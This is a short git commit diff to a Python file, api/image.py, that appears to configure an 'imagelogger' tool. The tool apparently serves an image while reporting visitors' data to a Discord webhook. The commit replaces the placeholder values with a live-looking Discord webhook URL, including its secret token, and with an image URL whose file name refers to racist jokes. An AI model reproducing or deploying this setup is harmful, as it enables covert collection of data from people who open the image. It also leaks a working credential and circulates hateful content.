e2b4327a94bda3739b6c36c5e115211cf68b82c9
Sxber1292 <francescoarcudi735@gmail.com>
2025-02-07 19:30:53 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1337490599103696999/G55aGNZWMnq4zZea7ZG4zIXHK9eCeZL-WaR_eeuj_hqA5XoeJi1jfUeoJ3JP8tmZAD5E",
+    "image": "https://quotesbae.com/wp-content/uploads/2018/01/Amusing-true-racist-jokes-with-pictures-meme.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
